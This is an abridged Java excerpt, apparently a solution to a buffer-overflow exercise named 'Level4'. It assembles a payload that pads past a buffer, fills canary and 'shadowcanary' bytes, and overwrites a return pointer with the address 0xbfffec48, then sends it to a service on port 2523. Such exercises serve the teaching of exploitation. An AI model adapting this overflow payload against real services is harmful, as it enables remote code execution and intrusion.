...
public class Level4 {
    ...
    final static private int PORT = 2523;
    ...
    public static void main(String[] args) throws IOException {
        ...
        int shadowcanary = 4;
        int overhead = 12;
        byte[] bbuf = new byte[bufSize + canary + shadowcanary + overhead+ptrsize];
        ...
        // fill the shadowcanary
        bbuf[bufSize+canary] = 1;
        bbuf[bufSize+canary+1] = 1;
        bbuf[bufSize+canary+2] = 1;
        bbuf[bufSize+canary+3] = 1;
        
        // fill overhead
        for (int i = 0; i < overhead; i++) {
            bbuf[bufSize+canary+shadowcanary+i] = 1;
        }
        
      // fill the ptr
        bbuf[bufSize+canary+shadowcanary+overhead] = (byte) 0x48;
        bbuf[bufSize+canary+shadowcanary+overhead+1] = (byte) 0xec;
        bbuf[bufSize+canary+shadowcanary+overhead+2] = (byte) 0xff;
        bbuf[bufSize+canary+shadowcanary+overhead+3] = (byte) 0xbf;
        haxx(PORT, bbuf);
    }
}
